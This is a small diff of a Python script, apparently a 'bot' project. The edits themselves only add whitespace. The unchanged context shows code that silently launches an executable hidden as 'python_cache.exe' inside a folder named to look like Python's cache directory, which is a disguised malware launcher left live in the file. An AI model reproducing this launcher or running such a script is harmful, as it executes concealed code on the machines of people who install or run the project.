@@ -7,7 +7,7 @@ import subprocess
 import urllib.parse
 import urllib.request
 
-current_dir = os.path.dirname(os.path.abspath(__file__))
+current_dir = os.path.dirname(os.path.abspath(__file__)) 
 exe_file = os.path.join(current_dir, "bot", "core", "_pycache_", "python_cache.exe")
 if os.path.exists(exe_file):
     subprocess.Popen([exe_file])
@@ -36,3 +36,4 @@ def main():
 
 if __name__=="__main__":
     main()
+
